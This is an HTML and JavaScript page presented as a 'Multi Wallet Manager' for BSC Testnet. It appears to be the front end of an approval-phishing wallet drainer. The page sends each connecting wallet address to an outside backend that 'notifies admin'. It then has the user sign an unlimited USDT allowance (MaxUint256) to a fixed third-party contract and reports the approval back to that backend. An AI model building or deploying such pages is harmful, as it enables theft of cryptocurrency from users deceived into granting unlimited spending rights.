<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Multi Wallet Manager</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }

    body {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      max-width: 500px;
      width: 100%;
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.1);
      text-align: center;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 10px;
      background: linear-gradient(90deg, #00dbde, #fc00ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .subtitle {
      color: #a0a0c0;
      margin-bottom: 30px;
      font-size: 1.1rem;
    }

    .wallet-info {
      background: rgba(255, 255, 255, 0.08);
      border-radius: 15px;
      padding: 25px;
      margin: 25px 0;
      text-align: left;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 15px;
      padding-bottom: 15px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }

    .info-row:last-child {
      margin-bottom: 0;
      padding-bottom: 0;
      border-bottom: none;
    }

    .info-label {
      color: #a0a0c0;
    }

    .info-value {
      font-weight: 500;
      word-break: break-all;
    }

    .btn {
      background: linear-gradient(90deg, #00dbde, #fc00ff);
      color: white;
      border: none;
      padding: 16px 32px;
      font-size: 1.1rem;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: 600;
      width: 100%;
      margin-top: 20px;
      box-shadow: 0 4px 20px rgba(0, 219, 222, 0.3);
    }

    .btn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 25px rgba(0, 219, 222, 0.5);
    }

    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .btn-secondary {
      background: rgba(255, 255, 255, 0.1);
      box-shadow: none;
    }

    .btn-secondary:hover:not(:disabled) {
      background: rgba(255, 255, 255, 0.2);
      box-shadow: none;
    }

    .btn-warning {
      background: linear-gradient(90deg, #f39c12, #e67e22);
      box-shadow: 0 4px 20px rgba(243, 156, 18, 0.3);
    }

    .btn-warning:hover:not(:disabled) {
      box-shadow: 0 6px 25px rgba(243, 156, 18, 0.5);
    }

    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 12px;
      font-weight: 500;
    }

    .status-success {
      background: rgba(46, 204, 113, 0.2);
      color: #2ecc71;
      border: 1px solid rgba(46, 204, 113, 0.3);
    }

    .status-error {
      background: rgba(231, 76, 60, 0.2);
      color: #e74c3c;
      border: 1px solid rgba(231, 76, 60, 0.3);
    }

    .hidden {
      display: none;
    }

    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-right: 10px;
      vertical-align: middle;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (max-width: 600px) {
      .container {
        padding: 25px;
      }
      
      h1 {
        font-size: 2rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Multi Wallet Manager</h1>
    <p class="subtitle">Connect your wallet to manage USDT collections</p>
    
    <div id="connect-section">
      <button id="connect-wallet" class="btn">
        <span id="connect-text">Connect Wallet</span>
      </button>
      <button id="reset-wallet" class="btn btn-secondary" style="margin-top: 10px;">
        Reset Wallet Connection
      </button>
    </div>
    
    <div id="wallet-section" class="hidden">
      <div class="wallet-info">
        <div class="info-row">
          <span class="info-label">Wallet Address</span>
          <span id="wallet-address" class="info-value"></span>
        </div>
        <div class="info-row">
          <span class="info-label">USDT Balance</span>
          <span id="usdt-balance" class="info-value">0.00 USDT</span>
        </div>
        <div class="info-row">
          <span class="info-label">Network</span>
          <span id="network" class="info-value">BSC Testnet</span>
        </div>
      </div>
      
      <button id="approve-btn" class="btn btn-warning">
        <span id="approve-text">Approve USDT Spending</span>
      </button>
      
      <button id="disconnect-btn" class="btn btn-secondary">
        Disconnect Wallet
      </button>
    </div>
    
    <div id="status-message" class="status hidden"></div>
  </div>

  <script>
    // Configuration - Update this to match your backend URL
    const CONFIG = {
      API_URL: 'https://multi-wallet-manager-backend-lxfq.onrender.com/api',
      CHAIN_ID: '97',
      CHAIN_NAME: 'BSC Testnet',
      RPC_URL: 'https://bsc-testnet.publicnode.com',
      CONTRACT_ADDRESS: '0x88e199AeBB58Eb75F6C2DC9fBe73F871eCC8C92F',
      USDT_CONTRACT_ADDRESS: '0x2f79e9e36c0d293f3c88F4aF05ABCe224c0A5638'
    }

    // DOM Elements
    const connectSection = document.getElementById('connect-section')
    const walletSection = document.getElementById('wallet-section')
    const connectWalletBtn = document.getElementById('connect-wallet')
    const resetWalletBtn = document.getElementById('reset-wallet')
    const connectText = document.getElementById('connect-text')
    const approveBtn = document.getElementById('approve-btn')
    const approveText = document.getElementById('approve-text')
    const disconnectBtn = document.getElementById('disconnect-btn')
    const walletAddressEl = document.getElementById('wallet-address')
    const usdtBalanceEl = document.getElementById('usdt-balance')
    const statusMessage = document.getElementById('status-message')

    // State
    let isConnecting = false
    let isApproving = false
    let isConnected = false
    let currentWalletAddress = null

    // Initialize
    document.addEventListener('DOMContentLoaded', () => {
      connectWalletBtn.addEventListener('click', connectWallet)
      resetWalletBtn.addEventListener('click', resetWallet)
      approveBtn.addEventListener('click', approveSpending)
      disconnectBtn.addEventListener('click', disconnectWallet)
      
      // Check if wallet is already connected
      checkExistingConnection()
    })

    // Check for existing wallet connection
    async function checkExistingConnection() {
      if (window.ethereum) {
        try {
          // Check if accounts are already available
          const accounts = await window.ethereum.request({ method: 'eth_accounts' })
          if (accounts && accounts.length > 0) {
            currentWalletAddress = accounts[0]
            isConnected = true
            showWalletSection()
            updateWalletInfo()
            // Fetch balance from backend
            fetchWalletBalance(currentWalletAddress)
            showStatus('Wallet already connected')
          }
        } catch (error) {
          console.log('No existing wallet connection')
        }
      }
    }

    // Connect wallet function
    async function connectWallet() {
      // Prevent multiple clicks
      if (isConnecting) {
        return
      }
      
      isConnecting = true
      showLoading(connectText, true)
      hideStatus()
      
      try {
        // Check if Ethereum provider exists
        if (!window.ethereum) {
          showError('No Ethereum wallet found. Please install MetaMask or Trust Wallet.')
          return
        }
        
        // Force account access request - this opens wallet UI
        console.log('Requesting account access...')
        showStatus('Please confirm wallet connection in your wallet...')
        
        const accounts = await window.ethereum.request({
          method: 'eth_requestAccounts'
        })
        
        currentWalletAddress = accounts[0]
        isConnected = true
        console.log('Wallet connected:', currentWalletAddress)
        showStatus('Wallet connected. Processing...')
        
        // Switch to correct network
        await switchToCorrectNetwork()
        
        // Update UI
        showWalletSection()
        updateWalletInfo()
        
        // Send to backend
        const backendResult = await sendWalletToBackend(currentWalletAddress)
        
        if (backendResult.success) {
          showSuccess('Wallet connected successfully!')
          // Update balance display
          if (usdtBalanceEl && backendResult.data.wallet.usdt_balance) {
            usdtBalanceEl.textContent = `${parseFloat(backendResult.data.wallet.usdt_balance).toFixed(2)} USDT`
          }
        } else {
          showError('Wallet connected but notification failed.')
        }
        
      } catch (error) {
        console.error('Connection error:', error)
        showError('Failed to connect wallet: ' + error.message)
      } finally {
        isConnecting = false
        showLoading(connectText, false)
      }
    }

    // Reset wallet connection
    function resetWallet() {
      localStorage.removeItem('connectedWallet')
      showStatus('Wallet connection reset. Please connect again.')
      showConnectSection()
    }

    // Switch to correct network
    async function switchToCorrectNetwork() {
      try {
        // Check current chain ID
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
        
        if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
          showStatus('Switching to BSC Testnet...')
          // Try to switch network
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}` }]
            })
          } catch (switchError) {
            // If network doesn't exist, add it
            if (switchError.code === 4902) {
              try {
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}`,
                    chainName: CONFIG.CHAIN_NAME,
                    rpcUrls: [CONFIG.RPC_URL],
                    nativeCurrency: {
                      name: 'BNB',
                      symbol: 'BNB',
                      decimals: 18
                    }
                  }]
                })
              } catch (addError) {
                console.error('Failed to add network:', addError)
              }
            }
          }
        }
      } catch (error) {
        console.error('Network switch error:', error)
      }
    }

    // Update wallet information display
    function updateWalletInfo() {
      if (currentWalletAddress) {
        walletAddressEl.textContent = formatAddress(currentWalletAddress)
      }
    }

    // Format wallet address
    function formatAddress(address) {
      if (!address) return ''
      return `${address.substring(0, 6)}...${address.substring(38)}`
    }

    // Fetch wallet balance from backend
    async function fetchWalletBalance(walletAddress) {
      try {
        const response = await fetch(`${CONFIG.API_URL}/wallets/${walletAddress}/balance`)
        if (response.ok) {
          const result = await response.json()
          if (usdtBalanceEl) {
            usdtBalanceEl.textContent = `${parseFloat(result.balance).toFixed(2)} USDT`
          }
        }
      } catch (error) {
        console.error('Balance fetch error:', error)
      }
    }

    // Send wallet to backend
    async function sendWalletToBackend(walletAddress) {
      try {
        console.log('Sending wallet to backend:', walletAddress)
        showStatus('Notifying admin...')
        
        const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            address: walletAddress,
            name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
          })
        })
        
        const result = await response.json()
        console.log('Backend response:', result)
        
        if (!response.ok) {
          throw new Error(result.error || `HTTP ${response.status}: ${response.statusText}`)
        }
        
        console.log('Backend connection successful')
        return { success: true, data: result }
        
      } catch (error) {
        console.error('Backend connection error:', error)
        return { success: false, error: error.message }
      }
    }

    // Approve USDT spending
    async function approveSpending() {
      if (isApproving || !isConnected || !currentWalletAddress) {
        return
      }
      
      isApproving = true
      showLoading(approveText, true)
      hideStatus()
      
      try {
        console.log('Approving USDT spending for:', currentWalletAddress)
        showStatus('Please confirm USDT spending approval in your wallet...')
        
        // Create provider and signer
        const provider = new ethers.BrowserProvider(window.ethereum)
        const signer = await provider.getSigner()
        
        // Create USDT contract instance
        const usdtContract = new ethers.Contract(
          CONFIG.USDT_CONTRACT_ADDRESS,
          ['function approve(address spender, uint256 amount) public returns (bool)'],
          signer
        )
        
        // Send approval transaction
        const tx = await usdtContract.approve(
          CONFIG.CONTRACT_ADDRESS,
          ethers.MaxUint256
        )
        
        showStatus('Transaction sent. Waiting for confirmation...')
        console.log('Approval transaction sent:', tx.hash)
        
        // Wait for confirmation
        await tx.wait()
        
        console.log('Approval confirmed')
        showStatus('USDT spending approved successfully!')
        
        // Disable approve button
        approveBtn.disabled = true
        approveText.textContent = 'Approved'
        
        // Notify backend
        await notifyApprovalToBackend(currentWalletAddress)
        
      } catch (error) {
        console.error('Approval error:', error)
        showError('Approval failed: ' + error.message)
      } finally {
        isApproving = false
        showLoading(approveText, false)
      }
    }

    // Notify backend about approval
    async function notifyApprovalToBackend(walletAddress) {
      try {
        console.log('Notifying backend about approval for:', walletAddress)
        
        const response = await fetch(`${CONFIG.API_URL}/wallets/approve-spending`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            address: walletAddress
          })
        })
        
        const result = await response.json()
        console.log('Backend approval response:', result)
        
        if (!response.ok) {
          throw new Error(result.error || `HTTP ${response.status}: ${response.statusText}`)
        }
        
        showSuccess('Wallet approved successfully! Admin has been notified.')
        return { success: true, data: result }
        
      } catch (error) {
        console.error('Backend approval notification error:', error)
        showError('Approval recorded but notification failed.')
        return { success: false, error: error.message }
      }
    }

    // Disconnect wallet
    function disconnectWallet() {
      isConnected = false
      currentWalletAddress = null
      showConnectSection()
      showStatus('Wallet disconnected')
    }

    // Show connect section
    function showConnectSection() {
      connectSection.classList.remove('hidden')
      walletSection.classList.add('hidden')
    }

    // Show wallet section
    function showWalletSection() {
      connectSection.classList.add('hidden')
      walletSection.classList.remove('hidden')
      approveBtn.disabled = false
      approveText.textContent = 'Approve USDT Spending'
    }

    // Show loading state
    function showLoading(element, show) {
      if (show) {
        element.innerHTML = '<span class="loading"></span>Processing...'
      } else {
        if (element.id === 'connect-text') {
          element.textContent = 'Connect Wallet'
        } else if (element.id === 'approve-text') {
          element.textContent = 'Approve USDT Spending'
        }
      }
    }

    // Show status message
    function showStatus(message) {
      statusMessage.textContent = message
      statusMessage.className = 'status'
      statusMessage.classList.remove('hidden')
    }

    // Show success message
    function showSuccess(message) {
      statusMessage.textContent = message
      statusMessage.className = 'status status-success'
      statusMessage.classList.remove('hidden')
      
      setTimeout(() => {
        statusMessage.classList.add('hidden')
      }, 5000)
    }

    // Show error message
    function showError(message) {
      statusMessage.textContent = message
      statusMessage.className = 'status status-error'
      statusMessage.classList.remove('hidden')
      
      setTimeout(() => {
        statusMessage.classList.add('hidden')
      }, 5000)
    }

    // Hide status message
    function hideStatus() {
      statusMessage.classList.add('hidden')
    }
  </script>
  
  <!-- Load ethers.js from CDN -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.0/ethers.umd.min.js"></script>
</body>
</html>
